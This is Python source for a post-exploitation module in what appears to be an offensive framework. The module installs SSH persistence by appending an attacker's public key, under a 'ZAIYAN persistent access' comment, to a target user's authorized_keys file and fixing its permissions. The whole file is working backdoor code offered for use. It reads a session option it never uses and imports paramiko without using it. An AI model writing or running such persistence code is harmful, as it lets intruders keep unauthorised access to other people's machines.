import os
import paramiko
from pathlib import Path
from core.module_base import PostModule

class SSHKeyInject(PostModule):
    NAME = "ssh_key_inject"
    DESCRIPTION = "Inject SSH public key for persistent access"
    AUTHOR = "Anonymous-beta"
    PLATFORM = ["linux"]
    
    def _setup_options(self):
        super()._setup_options()
        self.options["KEY_PATH"] = {
            "description": "Path to public key to inject",
            "required": True,
            "value": "~/.ssh/id_rsa.pub"
        }
        self.options["USER"] = {
            "description": "Target user",
            "required": False,
            "value": ""
        }
    
    def execute(self):
        """Inject SSH key into authorized_keys"""
        session_id = self.get_option("SESSION")
        key_path = os.path.expanduser(self.get_option("KEY_PATH"))
        target_user = self.get_option("USER")
        
        print(f"[*] Session: {session_id}")
        print(f"[*] Key: {key_path}")
        
        if not os.path.exists(key_path):
            print(f"[-] Key not found: {key_path}")
            return False
        
        with open(key_path, "r") as f:
            pub_key = f.read().strip()
        
        # Determine target authorized_keys path
        if target_user:
            auth_keys_path = f"/home/{target_user}/.ssh/authorized_keys"
        else:
            auth_keys_path = os.path.expanduser("~/.ssh/authorized_keys")
        
        print(f"[*] Target: {auth_keys_path}")
        
        # Ensure .ssh directory exists
        ssh_dir = os.path.dirname(auth_keys_path)
        os.makedirs(ssh_dir, exist_ok=True)
        
        # Append key
        with open(auth_keys_path, "a") as f:
            f.write(f"\n# ZAIYAN persistent access\n{pub_key}\n")
        
        # Set proper permissions
        os.chmod(ssh_dir, 0o700)
        os.chmod(auth_keys_path, 0o600)
        
        print(f"[+] Key injected successfully")
        print(f"[+] Persistent access established via SSH")
        
        return {
            "status": "success",
            "key": pub_key[:50] + "...",
            "path": auth_keys_path
        }
